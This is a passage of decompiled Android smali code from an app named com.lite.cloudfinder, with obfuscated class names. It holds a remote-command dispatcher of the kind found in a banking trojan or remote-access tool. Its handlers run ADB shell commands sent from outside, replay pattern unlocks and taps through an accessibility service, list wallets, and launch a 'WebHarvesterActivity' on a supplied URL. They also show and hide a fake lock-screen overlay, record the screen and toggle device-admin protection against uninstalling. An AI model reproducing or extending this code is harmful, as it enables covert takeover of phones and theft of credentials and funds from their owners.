    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x6e

    goto/16 :goto_1

    :sswitch_93
    const-string v12, "adbUiTree"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x91

    goto/16 :goto_1

    :sswitch_94
    const-string v12, "setDebugOff"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x47

    goto/16 :goto_1

    :sswitch_95
    const-string v12, "startWebRTC"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x78

    goto/16 :goto_1

    :sswitch_96
    const-string v12, "adbStatus"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0xa2

    goto/16 :goto_1

    :sswitch_97
    const-string v12, "restartApp"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x5f

    goto/16 :goto_1

    :sswitch_98
    const-string v12, "hideShortcuts"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x55

    goto/16 :goto_1

    :sswitch_99
    const-string v12, "walletList"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x3a

    goto/16 :goto_1

    :sswitch_9a
    const-string v12, "restartSc"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x61

    goto :goto_1

    :sswitch_9b
    const-string v12, "restartMe"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x60

    goto :goto_1

    :sswitch_9c
    const-string v12, "volumeUp"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x2a

    goto :goto_1

    :sswitch_9d
    const-string v12, "stopCam"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x15

    goto :goto_1

    :sswitch_9e
    const-string v12, "startHD"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x8

    goto :goto_1

    :sswitch_9f
    const-string v12, "updateApk"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x53

    goto :goto_1

    :sswitch_a0
    const-string v12, "enableBiometric"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x59

    goto :goto_1

    :sswitch_a1
    const-string v12, "startAdbStream"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x9e

    goto :goto_1

    :sswitch_a2
    const-string v12, "patternUnlock"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    if-eqz v12, :cond_0

    const/16 v12, 0x22

    goto :goto_1

    :cond_0
    :goto_0
    const/4 v12, -0x1

    :goto_1
    const-string v14, "antiDelete"

    const-string v15, "config"

    const-string v2, "interval"

    move-object/from16 v19, v11

    const-string v11, ""

    move-object/from16 v20, v14

    iget-object v14, v1, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    packed-switch v12, :pswitch_data_0

    goto/16 :goto_c

    :pswitch_0
    :try_start_1
    new-instance v2, Lorg/json/JSONObject;

    invoke-direct {v2}, Lorg/json/JSONObject;-><init>()V

    invoke-static {}, Lڜأِجطّثٮ/ؠ;->أ()Lڜأِجطّثٮ/ؠ;

    move-result-object v3

    invoke-static {v14}, Lڜأِجطّثٮ/ء;->ة(Landroid/content/Context;)Lڜأِجطّثٮ/ء;

    move-result-object v7

    invoke-virtual {v3}, Lڜأِجطّثٮ/ؠ;->ئ()Z

    move-result v3

    invoke-virtual {v7}, Lڜأِجطّثٮ/ء;->ج()Z

    move-result v8

    const-string v11, "status"

    invoke-virtual {v2, v6, v11}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v11, "connected"

    invoke-virtual {v2, v11, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    const-string v11, "paired"

    invoke-virtual {v2, v11, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    const-string v11, "supported"

    invoke-static {}, Lڜأِجطّثٮ/ء;->خ()Z

    move-result v12

    invoke-virtual {v2, v11, v12}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    const-string v11, "wifi"

    invoke-virtual {v7}, Lڜأِجطّثٮ/ء;->د()Z

    move-result v12

    invoke-virtual {v2, v11, v12}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    const-string v11, "pairing"

    invoke-virtual {v7}, Lڜأِجطّثٮ/ء;->ح()Z

    move-result v12

    invoke-virtual {v2, v11, v12}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    if-eqz v3, :cond_1

    const-string v3, "ADB\u5df2\u8fde\u63a5"

    goto :goto_2

    :cond_1
    if-eqz v8, :cond_2

    const-string v3, "\u5df2\u914d\u5bf9(\u7b49\u5f85\u8fde\u63a5)"

    goto :goto_2

    :cond_2
    invoke-static {}, Lڜأِجطّثٮ/ء;->خ()Z

    move-result v3

    if-nez v3, :cond_3

    const-string v3, "\u9700\u8981Android 11+"

    goto :goto_2

    :cond_3
    invoke-virtual {v7}, Lڜأِجطّثٮ/ء;->د()Z

    move-result v3

    if-nez v3, :cond_4

    const-string v3, "\u9700\u8981WiFi\u8fde\u63a5"

    goto :goto_2

    :cond_4
    const-string v3, "\u5c31\u7eea\uff0c\u53ef\u914d\u5bf9"

    :goto_2
    invoke-virtual {v2, v5, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-static {}, Lڜٟٱڀ/د;->ؠ()Lڜٟٱڀ/د;

    move-result-object v7

    if-eqz v7, :cond_5

    invoke-virtual {v7, v4, v2}, Lڜٟٱڀ/د;->ؤ(Ljava/lang/String;Lorg/json/JSONObject;)V

    :cond_5
    invoke-virtual {v9, v3}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v13, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    goto/16 :goto_e

    :catchall_0
    move-exception v0

    move-object v2, v0

    :try_start_2
    const-string v3, "adbStatus FAILED"

    invoke-static {v13, v3, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    :try_start_3
    new-instance v3, Lorg/json/JSONObject;

    invoke-direct {v3}, Lorg/json/JSONObject;-><init>()V

    const-string v7, "error"

    invoke-virtual {v3, v6, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v6, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v3, v5, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-static {}, Lڜٟٱڀ/د;->ؠ()Lڜٟٱڀ/د;

    move-result-object v2

    if-eqz v2, :cond_9

    invoke-virtual {v2, v4, v3}, Lڜٟٱڀ/د;->ؤ(Ljava/lang/String;Lorg/json/JSONObject;)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3

    goto/16 :goto_e

    :pswitch_1
    :try_start_4
    invoke-static {}, Lڜأِجطّثٮ/ؤ;->آ()V

    goto/16 :goto_e

    :pswitch_2
    const-wide/16 v4, 0x320

    invoke-virtual {v3, v2, v4, v5}, Lorg/json/JSONObject;->optLong(Ljava/lang/String;J)J

    invoke-static {}, Lڜأِجطّثٮ/ؤ;->ء()V

    goto/16 :goto_e

    :pswitch_3
    invoke-static {}, Lڜأِجطّثٮ/أ;->آ()V

    goto/16 :goto_e

    :pswitch_4
    invoke-static {}, Lڝږ؁ڋ/د;->أ()V

    const-string v4, "quality"

    const/16 v5, 0x28

    invoke-virtual {v3, v4, v5}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result v4

    const/16 v5, 0x320

    invoke-virtual {v3, v2, v5}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result v2

    invoke-static {v4, v2}, Lڜأِجطّثٮ/أ;->ء(II)V

    goto/16 :goto_e

    :pswitch_5
    invoke-static {}, Lڜأِجطّثٮ/ؠ;->أ()Lڜأِجطّثٮ/ؠ;

    move-result-object v2

    invoke-virtual {v2}, Lڜأِجطّثٮ/ؠ;->ئ()Z

    move-result v3

    if-eqz v3, :cond_9

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v14}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, "/com.lite.cloudfinder.accessibility.MyAccessibilityService"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Lڜأِجطّثٮ/ؠ;->آ(Ljava/lang/String;)V

    goto/16 :goto_e

    :pswitch_6
    invoke-static {}, Lڜأِجطّثٮ/ؠ;->أ()Lڜأِجطّثٮ/ؠ;

    move-result-object v2

    invoke-virtual {v2}, Lڜأِجطّثٮ/ؠ;->ئ()Z

    move-result v3

    if-eqz v3, :cond_9

    invoke-virtual {v2}, Lڜأِجطّثٮ/ؠ;->ؠ()V

    goto/16 :goto_e

    :pswitch_7
    invoke-static {}, Lڜأِجطّثٮ/ؠ;->أ()Lڜأِجطّثٮ/ؠ;

    move-result-object v2

    invoke-virtual {v2}, Lڜأِجطّثٮ/ؠ;->ء()V

    invoke-static {v14}, Lڜأِجطّثٮ/ء;->ة(Landroid/content/Context;)Lڜأِجطّثٮ/ء;

    move-result-object v2

    invoke-virtual {v2}, Lڜأِجطّثٮ/ء;->ؠ()V

    goto/16 :goto_e

    :pswitch_8
    invoke-static {}, Lڜأِجطّثٮ/أ;->آ()V

    goto/16 :goto_8

    :pswitch_9
    invoke-static {}, Lڜأِجطّثٮ/أ;->آ()V

    goto/16 :goto_9

    :pswitch_a
    invoke-static {}, Lڜأِجطّثٮ/أ;->آ()V

    goto/16 :goto_a

    :pswitch_b
    const-string v2, "key"

    invoke-virtual {v3, v2, v11}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->isEmpty()Z

    move-result v3

    if-nez v3, :cond_9

    invoke-static {}, Lڜأِجطّثٮ/ؠ;->أ()Lڜأِجطّثٮ/ؠ;

    move-result-object v3

    invoke-virtual {v3, v2}, Lڜأِجطّثٮ/ؠ;->ا(Ljava/lang/String;)V

    goto/16 :goto_e

    :pswitch_c
    const-string v2, "x1"

    const/4 v4, 0x0

    invoke-virtual {v3, v2, v4}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result v6

    const-string v2, "y1"

    invoke-virtual {v3, v2, v4}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result v7

    const-string v2, "x2"

    invoke-virtual {v3, v2, v4}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result v8

    const-string v2, "y2"

    invoke-virtual {v3, v2, v4}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result v9

    const-string v2, "duration"

    const/16 v4, 0x12c

    invoke-virtual {v3, v2, v4}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result v10

    invoke-static {}, Lڜأِجطّثٮ/ؠ;->أ()Lڜأِجطّثٮ/ؠ;

    move-result-object v5

    invoke-virtual/range {v5 .. v10}, Lڜأِجطّثٮ/ؠ;->ث(IIIII)V

    goto/16 :goto_e

    :pswitch_d
    const-string v2, "x"

    const/4 v4, 0x0

    invoke-virtual {v3, v2, v4}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result v2

    const-string v5, "y"

    invoke-virtual {v3, v5, v4}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result v3

    invoke-static {}, Lڜأِجطّثٮ/ؠ;->أ()Lڜأِجطّثٮ/ؠ;

    move-result-object v4

    invoke-virtual {v4, v2, v3}, Lڜأِجطّثٮ/ؠ;->ج(II)V

    goto/16 :goto_e

    :pswitch_e
    new-instance v2, Ljava/lang/Thread;

    new-instance v3, Lةؽڗںۍټ٘/؋;

    const/16 v4, 0x9

    invoke-direct {v3, v4}, Lةؽڗںۍټ٘/؋;-><init>(I)V

    const-string v4, "AdbUiTree"

    invoke-direct {v2, v3, v4}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    goto :goto_3

    :pswitch_f
    new-instance v2, Ljava/lang/Thread;

    new-instance v3, Lةؽڗںۍټ٘/؋;

    const/16 v4, 0x8

    invoke-direct {v3, v4}, Lةؽڗںۍټ٘/؋;-><init>(I)V

    const-string v4, "AdbScreenshot"

    invoke-direct {v2, v3, v4}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    :goto_3
    invoke-virtual {v2}, Ljava/lang/Thread;->start()V

    goto/16 :goto_e

    :pswitch_10
    const-string v2, "cmd"

    invoke-virtual {v3, v2, v11}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->isEmpty()Z

    move-result v3

    if-eqz v3, :cond_6

    goto/16 :goto_e

    :cond_6
    new-instance v3, Ljava/lang/Thread;

    new-instance v4, Lڜٟٱڀ/ؠ;

    const/4 v5, 0x0

    invoke-direct {v4, v2, v5}, Lڜٟٱڀ/ؠ;-><init>(Ljava/lang/String;I)V

    const-string v2, "AdbShell"

    invoke-direct {v3, v4, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    invoke-virtual {v3}, Ljava/lang/Thread;->start()V

    goto/16 :goto_e

    :pswitch_11
    const-string v2, "code"

    invoke-virtual {v3, v2, v11}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const-string v4, "port"

    const/4 v5, 0x0

    invoke-virtual {v3, v4, v5}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result v3

    invoke-virtual {v2}, Ljava/lang/String;->isEmpty()Z

    move-result v4

    if-nez v4, :cond_8

    if-gtz v3, :cond_7

    goto :goto_4

    :cond_7
    invoke-static {v14}, Lڜأِجطّثٮ/ء;->ة(Landroid/content/Context;)Lڜأِجطّثٮ/ء;

    move-result-object v4

    invoke-virtual {v4, v3, v2}, Lڜأِجطّثٮ/ء;->ذ(ILjava/lang/String;)V

    goto/16 :goto_e

    :cond_8
    :goto_4
    const-string v2, "manualPair: missing code or port"

    invoke-static {v13, v2}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    goto/16 :goto_e

    :pswitch_12
    invoke-static {v14}, Lڜأِجطّثٮ/ء;->ة(Landroid/content/Context;)Lڜأِجطّثٮ/ء;

    move-result-object v2

    invoke-virtual {v2}, Lڜأِجطّثٮ/ء;->؋()V

    goto/16 :goto_e

    :pswitch_13
    invoke-virtual {v3, v8}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_9

    invoke-virtual {v3, v8}, Lorg/json/JSONObject;->isNull(Ljava/lang/String;)Z

    move-result v2

    if-nez v2, :cond_9

    invoke-virtual {v3, v7}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_9

    invoke-virtual {v3, v7}, Lorg/json/JSONObject;->isNull(Ljava/lang/String;)Z

    goto/16 :goto_e

    :pswitch_14
    const-string v2, "url"

    invoke-virtual {v3, v2, v11}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->isEmpty()Z

    move-result v3

    if-nez v3, :cond_9

    new-instance v3, Landroid/content/Intent;

    const-class v4, Lcom/lite/cloudfinder/activity/WebHarvesterActivity;

    invoke-direct {v3, v14, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v4, "target_url"

    invoke-virtual {v3, v4, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const/high16 v2, 0x10000000

    invoke-virtual {v3, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v14, v3}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    goto/16 :goto_e

    :pswitch_15
    const-string v2, "touches"

    invoke-virtual {v3, v2, v11}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const-string v4, "pkg"

    invoke-virtual {v3, v4, v11}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2}, Ljava/lang/String;->isEmpty()Z

    move-result v4

    if-nez v4, :cond_9

    invoke-static {v2, v3}, Lڝږ؁ڋ/ه;->ؠ(Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_e

    :pswitch_16
    invoke-virtual {v1, v3}, Lڜٟٱڀ/أ;->چ(Lorg/json/JSONObject;)V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1

    goto/16 :goto_e

    :pswitch_17
    :try_start_5
    sget-object v2, Lڝږ؁ڋ/ظ;->ة:Lڝږ؁ڋ/ظ;

    if-eqz v2, :cond_9

    iget-boolean v3, v2, Lڝږ؁ڋ/ظ;->ا:Z

    if-eqz v3, :cond_9

    invoke-virtual {v2}, Lڝږ؁ڋ/ظ;->ئ()V

    const-string v2, "Fake lock overlay hidden by command"

    invoke-static {v13, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_0

    goto/16 :goto_e

    :catch_0
    move-exception v0

    move-object v2, v0

    :try_start_6
    const-string v3, "handleHideLockOverlay error"

    invoke-static {v13, v3, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    goto/16 :goto_e

    :pswitch_18
    invoke-virtual {v1, v3}, Lڜٟٱڀ/أ;->ڃ(Lorg/json/JSONObject;)V

    goto/16 :goto_e

    :pswitch_19
    const/4 v2, 0x0

    invoke-virtual {v1, v2}, Lڜٟٱڀ/أ;->ڒ(Z)V

    goto/16 :goto_e

    :pswitch_1a
    const/4 v2, 0x1

    invoke-virtual {v1, v2}, Lڜٟٱڀ/أ;->ڒ(Z)V

    goto/16 :goto_e

    :pswitch_1b
    invoke-virtual {v1, v3}, Lڜٟٱڀ/أ;->ڂ(Lorg/json/JSONObject;)V

    goto/16 :goto_e

    :pswitch_1c
    invoke-virtual/range {p0 .. p0}, Lڜٟٱڀ/أ;->أ()V

    goto/16 :goto_e

    :pswitch_1d
    invoke-virtual {v1, v3}, Lڜٟٱڀ/أ;->ٶ(Lorg/json/JSONObject;)V

    goto/16 :goto_e

    :pswitch_1e
    invoke-virtual {v1, v3}, Lڜٟٱڀ/أ;->ٷ(Lorg/json/JSONObject;)V

    goto/16 :goto_e

    :pswitch_1f
    invoke-virtual {v1, v3}, Lڜٟٱڀ/أ;->ه(Lorg/json/JSONObject;)V

    goto/16 :goto_e

    :pswitch_20
    invoke-virtual {v1, v3}, Lڜٟٱڀ/أ;->ػ(Lorg/json/JSONObject;)V

    goto/16 :goto_e

    :pswitch_21
    invoke-virtual {v1, v3}, Lڜٟٱڀ/أ;->غ(Lorg/json/JSONObject;)V

    goto/16 :goto_e

    :pswitch_22
    invoke-virtual {v1, v3}, Lڜٟٱڀ/أ;->ظ(Lorg/json/JSONObject;)V

    goto/16 :goto_e

    :pswitch_23
    invoke-static/range {p2 .. p2}, Lڜٟٱڀ/أ;->ڠ(Lorg/json/JSONObject;)V

    goto/16 :goto_e

    :pswitch_24
    invoke-static/range {p2 .. p2}, Lڜٟٱڀ/أ;->ڡ(Lorg/json/JSONObject;)V

    goto/16 :goto_e

    :pswitch_25
    invoke-virtual/range {p0 .. p0}, Lڜٟٱڀ/أ;->ڑ()V

    goto/16 :goto_e

    :pswitch_26
    invoke-virtual/range {p0 .. p0}, Lڜٟٱڀ/أ;->ڌ()V

    goto/16 :goto_e

    :pswitch_27
    new-instance v2, Landroid/content/Intent;

    const-class v3, Lcom/lite/cloudfinder/service/ScreenRecordService;

    invoke-direct {v2, v14, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v14, v2}, Landroid/content/Context;->stopService(Landroid/content/Intent;)Z

    goto/16 :goto_e

    :pswitch_28
    invoke-static {}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ص()Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    move-result-object v2

    if-eqz v2, :cond_9

    const/4 v2, 0x0

    invoke-static {v2}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ٱ(Z)V

    goto/16 :goto_e

    :pswitch_29
    invoke-static {}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ص()Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    move-result-object v2

    if-eqz v2, :cond_9

    const/4 v2, 0x1

    invoke-static {v2}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ٱ(Z)V

    goto/16 :goto_e

    :pswitch_2a
    invoke-virtual/range {p0 .. p0}, Lڜٟٱڀ/أ;->إ()V

    goto/16 :goto_e

    :pswitch_2b
    invoke-virtual/range {p0 .. p0}, Lڜٟٱڀ/أ;->ؤ()V

    goto/16 :goto_e

    :pswitch_2c
    invoke-virtual/range {p0 .. p0}, Lڜٟٱڀ/أ;->ذ()V

    goto/16 :goto_e

    :pswitch_2d
    invoke-virtual/range {p0 .. p0}, Lڜٟٱڀ/أ;->ا()V

    goto/16 :goto_e

    :pswitch_2e
    invoke-virtual/range {p0 .. p0}, Lڜٟٱڀ/أ;->ب()V

    goto/16 :goto_e

    :pswitch_2f
    invoke-virtual {v1, v3}, Lڜٟٱڀ/أ;->ڙ(Lorg/json/JSONObject;)V

    goto/16 :goto_e

    :pswitch_30
    invoke-virtual/range {p0 .. p0}, Lڜٟٱڀ/أ;->ز()V

    goto/16 :goto_e

    :pswitch_31
    sget v2, Lcom/lite/cloudfinder/activity/ScreenCaptureActivity;->؋:I

    goto/16 :goto_e

    :pswitch_32
    invoke-virtual/range {p0 .. p0}, Lڜٟٱڀ/أ;->ٹ()V

    goto/16 :goto_e

    :pswitch_33
    invoke-virtual/range {p0 .. p0}, Lڜٟٱڀ/أ;->ؿ()V

    goto/16 :goto_e

    :pswitch_34
    invoke-virtual/range {p0 .. p0}, Lڜٟٱڀ/أ;->ٺ()V

    goto/16 :goto_e

    :pswitch_35
    invoke-virtual {v1, v3}, Lڜٟٱڀ/أ;->ٸ(Lorg/json/JSONObject;)V

    goto/16 :goto_e

    :pswitch_36
    invoke-virtual {v1, v3}, Lڜٟٱڀ/أ;->ي(Lorg/json/JSONObject;)V

    goto/16 :goto_e

    :pswitch_37
    invoke-virtual/range {p0 .. p0}, Lڜٟٱڀ/أ;->ٮ()V

    goto/16 :goto_e

    :pswitch_38
    invoke-virtual/range {p0 .. p0}, Lڜٟٱڀ/أ;->ڛ()V

    goto/16 :goto_e

    :pswitch_39
    invoke-virtual/range {p0 .. p0}, Lڜٟٱڀ/أ;->ٯ()V

    goto/16 :goto_e

    :pswitch_3a
    invoke-virtual/range {p0 .. p0}, Lڜٟٱڀ/أ;->ٻ()V

    goto/16 :goto_e

    :pswitch_3b
    invoke-virtual/range {p0 .. p0}, Lڜٟٱڀ/أ;->ټ()V

    goto/16 :goto_e

    :pswitch_3c
    invoke-virtual/range {p0 .. p2}, Lڜٟٱڀ/أ;->آ(Ljava/lang/String;Lorg/json/JSONObject;)V

    goto/16 :goto_e

    :pswitch_3d
    const/4 v2, 0x0

    invoke-virtual {v1, v2}, Lڜٟٱڀ/أ;->ئ(Z)V

    goto/16 :goto_e

    :pswitch_3e
    const/4 v2, 0x1

    invoke-virtual {v1, v2}, Lڜٟٱڀ/أ;->ئ(Z)V

    goto/16 :goto_e

    :pswitch_3f
    const/4 v5, 0x0

    const/4 v2, 0x0

    invoke-virtual {v14, v15, v2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v3

    invoke-interface {v3}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v3

    move-object/from16 v4, v20

    invoke-interface {v3, v4, v2}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    const-string v6, "device_policy"

    invoke-virtual {v14, v6}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Landroid/app/admin/DevicePolicyManager;

    new-instance v7, Landroid/content/ComponentName;

    const-class v8, Lcom/lite/cloudfinder/rda;

    invoke-direct {v7, v14, v8}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v6, v7}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v9

    if-eqz v9, :cond_anti_delete_removed

    invoke-virtual {v6, v7}, Landroid/app/admin/DevicePolicyManager;->removeActiveAdmin(Landroid/content/ComponentName;)V

    :cond_anti_delete_removed

    goto :goto_5

    :pswitch_40
    move-object/from16 v4, v20

    const/4 v5, 0x1

    const/4 v2, 0x0

    invoke-virtual {v14, v15, v2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v2

    invoke-interface {v2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    const/4 v3, 0x1

    invoke-interface {v2, v4, v3}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    :goto_5
    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->apply()V

    invoke-virtual {v1, v5}, Lڜٟٱڀ/أ;->reportAntiDeleteResult(Z)V

    goto/16 :goto_e

    :pswitch_41
    invoke-virtual/range {p0 .. p0}, Lڜٟٱڀ/أ;->ع()V

    goto/16 :goto_e

    :pswitch_42
    invoke-virtual/range {p0 .. p0}, Lڜٟٱڀ/أ;->ڄ()V

    goto/16 :goto_e

    :pswitch_43
    invoke-virtual {v1, v3}, Lڜٟٱڀ/أ;->ؾ(Lorg/json/JSONObject;)V

    goto/16 :goto_e

    :pswitch_44
    invoke-virtual {v1, v3}, Lڜٟٱڀ/أ;->ښ(Lorg/json/JSONObject;)V

    goto/16 :goto_e

    :pswitch_45
    invoke-virtual {v1, v3}, Lڜٟٱڀ/أ;->ڇ(Lorg/json/JSONObject;)V

    goto/16 :goto_e

    :pswitch_46
    invoke-virtual {v1, v3}, Lڜٟٱڀ/أ;->س(Lorg/json/JSONObject;)V

    goto/16 :goto_e

    :pswitch_47
    const/4 v2, 0x1

    goto :goto_6

    :pswitch_48
    const/4 v2, 0x0

    :goto_6
    invoke-static {v14, v2}, Lڗًقڔ/؋;->ؾ(Landroid/content/Context;Z)V

    goto/16 :goto_e

    :pswitch_49
